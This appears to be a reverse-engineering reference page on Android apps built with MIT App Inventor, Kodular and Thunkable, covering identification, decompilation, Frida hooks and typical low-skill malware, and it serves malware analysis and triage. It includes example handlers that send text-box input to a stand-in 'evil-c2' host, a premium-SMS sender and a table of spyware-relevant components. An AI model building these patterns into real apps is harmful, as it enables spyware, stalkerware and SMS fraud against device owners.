# MIT App Inventor / Kodular / Thunkable

MIT App Inventor and its derivatives (Kodular, Thunkable) are visual block-programming platforms that generate standard Android APKs from drag-and-drop logic. The user builds screens and logic using Scratch-like blocks in a web browser, and the platform's server-side compiler translates those blocks into Java source code, compiles it to DEX, and packages it with the App Inventor runtime libraries. The resulting APK is a standard Android application -- no custom VM, no embedded interpreter, no bytecode format. All code lives in conventional DEX and decompiles with [jadx](https://github.com/skylot/jadx) like any native Android app.

## Architecture

### Compilation Pipeline

The block-to-APK pipeline works entirely server-side:

| Stage | Output |
|-------|--------|
| **Block editor** | JSON representation of visual blocks (`.bky` / `.scm` files) |
| **YAIL generation** | Blocks are converted to YAIL (Young Android Intermediate Language), a Scheme-like DSL |
| **Java code generation** | YAIL is compiled to Java source code using the App Inventor runtime API |
| **Standard Android build** | Java is compiled to `.class` files, then to DEX via d8/dx, packaged as APK |

The final APK contains standard DEX bytecode. There is no runtime interpreter for blocks -- all block logic becomes Java method calls against the App Inventor component library (e.g., `com.google.appinventor.components.runtime.Button`, `com.google.appinventor.components.runtime.WebViewer`).

### Runtime Library

Every App Inventor APK ships with the full runtime library, regardless of which components the app uses. This adds a consistent set of classes under `com.google.appinventor.components.runtime.*` and supporting packages. The runtime handles:

- Component lifecycle management
- Event dispatch from UI elements to generated handler methods
- Permission requests
- Inter-component communication

### Kodular / Thunkable Variants

Kodular and Thunkable fork the App Inventor codebase and add proprietary extensions:

| Platform | Package Prefix | Notable Differences |
|----------|---------------|---------------------|
| **MIT App Inventor** | `com.google.appinventor.*` | Original, open-source runtime |
| **Kodular** | `com.google.appinventor.*` (reused) + `io.makeroid.*` | Additional monetization components (AdMob, Facebook Ads), custom UI extensions |
| **Thunkable** | `com.thunkable.*` | Cross-platform (Android + iOS), different component set |

## Identification

| Indicator | Location |
|-----------|----------|
| `assets/youngandroidproject/` | Project metadata directory (definitive indicator) |
| `assets/youngandroidproject/project.properties` | Build properties file |
| `com.google.appinventor.components.runtime.*` | Runtime library classes in DEX |
| `appinventor.ai_*` | Default package prefix for user projects (e.g., `appinventor.ai_john.HelloWorld`) |
| `io.makeroid.*` | Kodular-specific extensions |
| `com.thunkable.*` | Thunkable-specific runtime |
| `Screen1.java` / `Screen1` activity | Default first screen name |

Quick check:

```bash
unzip -l target.apk | grep -E "(youngandroidproject|appinventor)"
```

The `assets/youngandroidproject/project.properties` file contains the original project name, author email (often visible in the package name as `appinventor.ai_<email>`), and build timestamp.

## Code Location & Extraction

All app logic compiles into standard DEX. There is no separate script file, bytecode bundle, or asset-embedded code to extract. Decompilation follows the standard Android workflow:

```bash
jadx -d output/ target.apk
```

### Generated Code Structure

App Inventor generates a predictable Java class hierarchy:

| Class | Purpose |
|-------|---------|
| `Screen1` (extends `Form`) | Main activity, contains all component initialization and event handlers |
| `Screen2`, `Screen3`, etc. | Additional screens |
| `com.google.appinventor.components.runtime.Form` | Base activity class |
| `com.google.appinventor.components.runtime.*` | All UI and logic components |

Each screen is a single class containing all event handler methods for that screen's components. A button click handler, for example, becomes a method like `Button1Click()` on the screen class.

### Generated Code Patterns

App Inventor's code generator produces distinctive Java patterns. Recognizing these helps separate auto-generated boilerplate from actual app logic.

**Component initialization** (in the screen's `$define()` method):

```java
private void $define() {
    this.Button1 = new Button(this);
    this.Button1.Text("Send Data");
    this.WebViewer1 = new WebViewer(this);
    this.WebViewer1.HomeUrl("https://evil-c2.example.com/panel");
    this.TextBox1 = new TextBox(this);
}
```

**Event dispatcher pattern** (the central dispatch method):

```java
public boolean dispatchEvent(Component component, String eventName, String componentName, Object[] params) {
    if (component.equals(this.Button1) && eventName.equals("Click")) {
        Button1Click();
        return true;
    }
    if (component.equals(this.Clock1) && eventName.equals("Timer")) {
        Clock1Timer();
        return true;
    }
    return false;
}
```

**Web request pattern** (data exfiltration in block-built spyware):

```java
private void Button1Click() {
    this.Web1.Url("https://evil-c2.example.com/steal?data=" + this.TextBox1.Text());
    this.Web1.Get();
}
```

**SMS sending pattern**:

```java
private void Button1Click() {
    this.Texting1.PhoneNumber(this.TextBox1.Text());
    this.Texting1.Message("Premium SMS content");
    this.Texting1.SendMessage();
}
```

All variable names match the component names assigned in the visual editor (e.g., `Button1`, `WebViewer1`, `TextBox1`). These names are rarely obfuscated because the platforms do not offer renaming or obfuscation features.

## Analysis Workflow

1. **Unzip APK** and confirm App Inventor origin (`assets/youngandroidproject/`)
2. **Check `project.properties`** for author email, project name, build date
3. **Decompile with jadx** -- focus on screen classes (`Screen1`, `Screen2`, etc.)
4. **Read `$define()`** to enumerate all components and their initial configuration (URLs, phone numbers, API keys)
5. **Read `dispatchEvent()`** to map UI events to handler methods
6. **Trace handler methods** for data exfiltration (Web component), SMS abuse (Texting component), file access (File component)
7. **Search for hardcoded URLs** -- C2 endpoints are almost always plaintext string literals

### Key Components to Watch

| Component | Abuse Potential |
|-----------|----------------|
| `Web` | HTTP requests to C2, data exfiltration via GET/POST |
| `Texting` | Premium SMS fraud, SMS spam |
| `PhoneCall` | Premium number dialing |
| `ContactPicker` / `PhoneNumberPicker` | Contact harvesting |
| `LocationSensor` | GPS tracking |
| `Camera` / `Camcorder` | Covert photo/video capture |
| `File` | Read/write to external storage |
| `TinyDB` / `TinyWebDB` | Local and remote key-value storage (exfiltration via TinyWebDB) |
| `Clock` | Timer-based triggers for periodic data collection |
| `Notifier` | Fake alerts, social engineering dialogs |
| `ActivityStarter` | Launch other apps, open URLs |

## Hooking

App Inventor apps use standard Java classes -- no custom VM or interpreter layer. Frida hooks target the runtime component methods directly:

### Intercept All Web Requests

```javascript
Java.perform(function() {
    var Web = Java.use("com.google.appinventor.components.runtime.Web");

    Web.Get.implementation = function() {
        console.log("[Web.Get] URL: " + this.Url());
        this.Get();
    };

    Web.PostText.implementation = function(text) {
        console.log("[Web.PostText] URL: " + this.Url() + " Body: " + text);
        this.PostText(text);
    };
});
```

### Intercept SMS Sending

```javascript
Java.perform(function() {
    var Texting = Java.use("com.google.appinventor.components.runtime.Texting");

    Texting.SendMessage.implementation = function() {
        console.log("[SMS] To: " + this.PhoneNumber() + " Msg: " + this.Message());
        this.SendMessage();
    };
});
```

### Intercept Location Reads

```javascript
Java.perform(function() {
    var LocationSensor = Java.use("com.google.appinventor.components.runtime.LocationSensor");

    LocationSensor.Latitude.implementation = function() {
        var lat = this.Latitude();
        console.log("[Location] Latitude: " + lat);
        return lat;
    };

    LocationSensor.Longitude.implementation = function() {
        var lon = this.Longitude();
        console.log("[Location] Longitude: " + lon);
        return lon;
    };
});
```

## Obfuscation

App Inventor, Kodular, and Thunkable do not provide any code obfuscation. The generated APKs ship with unobfuscated component names, plaintext string literals for all URLs and API keys, no R8/ProGuard processing, and the full runtime library with debug-friendly class names.

## Malware Context

App Inventor and its derivatives are the primary tool for non-programmer threat actors building Android malware. The visual block interface requires zero coding ability, lowering the barrier to creating functional spyware and fraud tools.

| Use Case | Details |
|----------|---------|
| Stalkerware | Location tracking, SMS reading, contact exfiltration built by non-technical individuals targeting domestic partners |
| Educational malware | Students and script kiddies building proof-of-concept spyware from YouTube tutorials |
| Premium SMS fraud | Timer-triggered SMS sending to premium-rate numbers |
| Credential phishing | Simple apps with fake login forms that POST credentials to a C2 endpoint via the Web component |
| Scam apps | Fake utility apps (battery boosters, WiFi hackers) that display ads or harvest data |
| Adware | Kodular apps built solely to display interstitial ads, sometimes with deceptive UI |

### Characteristics of App Inventor Malware

- **Low sophistication** -- no accessibility abuse, no overlay injection, no ATS, no dynamic code loading
- **Plaintext C2** -- server URLs and API keys are always visible in decompiled source
- **Identifiable authors** -- the `appinventor.ai_<email>` package prefix often contains the author's real email address
- **No persistence** -- no boot receivers, no foreground services, no device admin abuse
- **Single-purpose** -- each sample typically does one thing (track location, send SMS, steal contacts)
- **High volume, low impact** -- Google Play Protect catches most of these; they survive primarily on sideloading and third-party stores

!!! info "Prevalence"
    App Inventor-based malware accounts for a significant portion of low-sophistication Android threats seen on third-party app stores and sideloading sites. The `appinventor.ai_*` package prefix is a reliable triage signal for classifying a sample as low-skill, likely stalkerware or scam.

## RE Difficulty Assessment

| Aspect | Rating |
|--------|--------|
| Code format | Standard DEX (Java) |
| Readability | Very high -- unobfuscated, descriptive component names |
| String extraction | Trivial -- all plaintext |
| Control flow recovery | Full -- standard Java decompilation |
| Patching | Standard APK patching (smali editing or jadx export) |
| Obfuscation ceiling | None -- platforms offer no obfuscation |
| Overall difficulty | **Very Easy** |

App Inventor apps are among the easiest Android applications to reverse engineer. The generated code is verbose but completely transparent, with no obfuscation, no native code, and no custom bytecode. A single jadx pass reveals all functionality.

## References

- [MIT App Inventor -- Official Site](https://appinventor.mit.edu/)
- [MIT App Inventor -- GitHub](https://github.com/mit-cml/appinventor-sources)
- [Kodular -- Official Site](https://www.kodular.io/)
- [Thunkable -- Official Site](https://thunkable.com/)
- [jadx -- Dex to Java Decompiler](https://github.com/skylot/jadx)
- [Frida -- Dynamic Instrumentation Toolkit](https://frida.re/)
